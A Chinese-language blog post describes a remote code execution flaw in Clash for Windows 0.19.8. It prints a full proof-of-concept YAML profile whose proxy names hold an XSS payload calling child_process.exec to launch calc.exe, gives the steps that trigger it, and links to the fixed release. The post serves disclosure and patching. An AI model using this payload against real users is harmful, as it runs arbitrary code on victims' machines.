---
title: Clash_for_windows远程代码执行
comments: true
tags:
  - cve
  - clash
  - rce
categories: cve
keywords: clash
top_img: https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/clash.png
cover: https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/clash.png
abbrlink: 21b62bea
date: 2022-02-27 20:32:20
---

## 遵纪守法

任何个人和组织使用网络应当遵守宪法法律，遵守公共秩序，尊重社会公德，不得危害网络安全，不得利用网络从事危害国家安全、荣誉和利益

## 漏洞描述

crash_for_windows_pkg由 Electron 提供支持。如果 XSS 负载以代理的名义，我们可以远程执行受害者计算机上的任何 JavaScript 代码。

## 影响版本

0.19.8（0.19.9版本还有（mac目前没发现）

## POC

```
port: 7890
socks-port: 7891
allow-lan: true
mode: Rule
log-level: info
external-controller: :9090
proxies:
  - name: a<img/src="1"/onerror=eval(`require("child_process").exec("calc.exe");`);>
    type: socks5
    server: 127.0.0.1
    port: "17938"
    skip-cert-verify: true
  - name: abc
    type: socks5
    server: 127.0.0.1
    port: "8088"
    skip-cert-verify: true

proxy-groups:
  -
    name: <img/src="1"/onerror=eval(`require("child_process").exec("calc.exe");`);>
    type: select
    proxies:
    - a<img/src="1"/onerror=eval(`require("child_process").exec("calc.exe");`);>
```

## 漏洞利用

1、导入POC配置文件
2、切换到"`Profiles`"
3、单击“`Proxies`”即可触发
![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/clash.png)

## 修复建议

作者已发布了修复版本，下载更新即可
[https://github.com/Fndroid/clash_for_windows_pkg/releases](https://github.com/Fndroid/clash_for_windows_pkg/releases)
